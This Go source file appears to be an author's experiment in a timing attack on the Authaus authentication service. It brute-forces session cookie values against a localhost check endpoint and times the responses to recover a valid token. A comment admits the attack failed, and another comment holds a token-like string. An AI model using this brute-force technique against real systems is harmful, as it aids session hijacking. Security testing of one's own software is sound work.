package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"math"
	"net/http"
	"time"
)

/*
Attempts at a timing attack on Authaus.
Unfortunately I was not able to do this. At first I thought that it might be that the memcmp was
comparing in 4 or 8 byte words, so I implemented the ability to iterate on words of arbitrary size.
This gets prohibitively expensive, fast. If you wanted to iterate on 4-byte words, that's already
62^4 (= 14776336) combinations.
I tried to attack the session cache as well as the raw DB sessions, but neither yielded times
of any significance. I feel like there must be a way to do this, but I don't know how.
*/

const TokenCorpus = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
const NumSamplesBurn = 50
const NumSamples = 500
const ChunkSize = 1

var ChunkSpaceSize uint64

// OIRFtfKOKOHnW6JSeD7sUONusXl8p4

func main() {
	ChunkSpaceSize = uint64(math.Pow(float64(len(TokenCorpus)), float64(ChunkSize)))

	client := http.Client{}
	bestAttempt := ""
	numReq := 0

	for i := 0; i < 1; i++ {
		totalAvgTime := 0.0
		maxTime := 0.0
		maxTimeChunk := uint64(0)
		for chunk := uint64(0); chunk < ChunkSpaceSize; chunk++ {
			elapsed := int64(0)
			attempt := bestAttempt + chunkToString(chunk)
			for sample := 0; sample < NumSamples+NumSamplesBurn; sample++ {
				numReq++
				if numReq%1000 == 0 {
					fmt.Printf(".")
				}
				req, _ := http.NewRequest("GET", "http://127.0.0.1/auth2/check", nil)
				cookie := &http.Cookie{
					Name:  "session",
					Value: attempt,
				}
				req.AddCookie(cookie)
				start := time.Now()
				resp, err := client.Do(req)
				if sample >= NumSamplesBurn {
					elapsed += time.Now().Sub(start).Nanoseconds()
				}
				io.Copy(ioutil.Discard, resp.Body)
				resp.Body.Close()
				if err != nil {
					fmt.Printf("Transport error: %v\n", err)
					break
				} else {
					if resp.StatusCode == http.StatusOK {
						fmt.Printf("Success: session = %v\n", attempt)
						break
					} else {
						//reply_b, _ := ioutil.ReadAll(resp.Body)
						//reply := string(reply_b)
						//fmt.Printf("Success: %v (%v)\n", reply, attempt)
					}
				}
			}
			avg := float64(elapsed) / float64(NumSamples)
			if avg > maxTime {
				maxTime = avg
				maxTimeChunk = chunk
			}
			totalAvgTime += avg
		}

		fmt.Printf("\n")
		fmt.Printf("Average %f. Max %f (%v)", totalAvgTime/float64(ChunkSpaceSize), maxTime, chunkToString(maxTimeChunk))
		//avg := average(times)
		//for j := 0; j < len(times); j++ {
		//	stars := int(20 * float64(times[j]) / avg)
		//	fmt.Printf("%s ", TokenCorpus[j:j+1])
		//	for k := 0; k < stars; k++ {
		//		fmt.Print("*")
		//	}
		//	fmt.Print("\n")
		//}
	}
}

func chunkToString(chunk uint64) string {
	digits := make([]byte, ChunkSize)
	for i := 0; i < ChunkSize; i++ {
		q := chunk % uint64(len(TokenCorpus))
		chunk = chunk / uint64(len(TokenCorpus))
		digits[ChunkSize-i-1] = TokenCorpus[q]
	}
	return string(digits)
}

func initialString() string {
	s := make([]byte, ChunkSize)
	for i := 0; i < ChunkSize; i++ {
		s[i] = TokenCorpus[0]
	}
	return string(s)
}

func average(times []int64) float64 {
	sum := 0.0
	for i := 0; i < len(times); i++ {
		sum += float64(times[i])
	}
	return sum / float64(len(times))
}
